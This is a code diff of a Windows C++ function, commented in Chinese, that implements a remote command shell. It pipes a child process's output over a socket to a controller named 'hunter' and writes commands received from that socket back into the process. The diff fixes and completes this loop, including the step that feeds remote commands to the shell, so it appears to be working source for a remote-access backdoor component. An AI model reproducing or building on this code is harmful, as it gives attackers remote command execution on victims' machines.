@@ -88,52 +88,55 @@ DWORD Shell::threadProc(LPVOID args) {
 		DWORD dwBytesResult = 0;
 		RtlZeroMemory(szResult, sizeof(szResult));
 		// 先看有没有数据 防止没有数据还去读引起堵塞
-		if (!PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
-			break;
-		}
-		// 有数据就读
-		if (dwBytesResult) {
-			RtlZeroMemory(szResult, sizeof(szResult));
-			if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
-				break;
-			}
+		if (PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
+			// 有数据就读
+			if (dwBytesResult) {
+				RtlZeroMemory(szResult, sizeof(szResult));
+				if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
+					OutputDebugStringA("cannot read pipe\r\n");
+					break;
+				}
 
-			// 读到了就发给hunter
-			while (true) {
-				// 非阻塞主要是用在读套接字 这里的非阻塞写是不得已
-				int ret = send(gSocket, szResult, lstrlenA(szResult), 0);
-				if (ret == SOCKET_ERROR)
-				{
-					int r = WSAGetLastError();
-					// 还不可以写
-					if (r == WSAEWOULDBLOCK)
+				// 读到了就发给hunter
+				while (true) {
+					// 非阻塞主要是用在读套接字 这里的非阻塞写是不得已
+					int ret = send(gSocket, szResult, lstrlenA(szResult), 0);
+					if (ret == SOCKET_ERROR)
 					{
-						// 对于写来说是一定要写的(前提是因为阻塞不可写的情况)
-						continue;
+						int r = WSAGetLastError();
+						// 还不可以写
+						if (r == WSAEWOULDBLOCK)
+						{
+							// 对于写来说是一定要写的(前提是因为阻塞不可写的情况)
+							continue;
+						}
+						else
+						{
+							OutputDebugStringA("cannot write socket and stop shell\r\n");
+							// 出问题就走你
+							CloseHandle(ghReadPipe1);
+							CloseHandle(ghReadPipe2);
+							CloseHandle(ghWritePipe1);
+							CloseHandle(ghWritePipe2);
+							TerminateProcess(gPi.hProcess, 0); // 一定要关闭子进程啊！！！！！
+							CloseHandle(gPi.hProcess);
+							closesocket(gSocket);
+							gSocket = SOCKET_ERROR;
+							return 1;
+						}
 					}
 					else
 					{
-						OutputDebugStringA("cannot write socket and stop shell\r\n");
-						// 出问题就走你
-						CloseHandle(ghReadPipe1);
-						CloseHandle(ghReadPipe2);
-						CloseHandle(ghWritePipe1);
-						CloseHandle(ghWritePipe2);
-						closesocket(gSocket);
-						gSocket = SOCKET_ERROR;
-						return 1;
+						// 写完就继续
+						break;
 					}
-				}
-				else
-				{
-					// 写完就继续
-					break;
 				}
 			}
 		}
 
 		// -------------------------------接收套接字数据部分（命令输入）----------------------------
 
+		// 接收命令
 		RtlZeroMemory(szSend, sizeof(szSend));
 		int ret = recv(gSocket, szSend, sizeof(szSend), 0);
 		if (ret == SOCKET_ERROR)
@@ -148,6 +151,13 @@ DWORD Shell::threadProc(LPVOID args) {
 				OutputDebugStringA("cannot read socket and stop shell\r\n");
 				break;
 			}
+		}
+		// 输入管道
+		// 第三个参数填写要输入字符的数量即可
+		DWORD dwBytesWrite = 0;
+		if (!WriteFile(ghWritePipe2, szSend, lstrlenA(szSend), &dwBytesWrite, NULL)) {
+			OutputDebugStringA("cannot write pipe\r\n");
+			break;
 		}
 	}
 
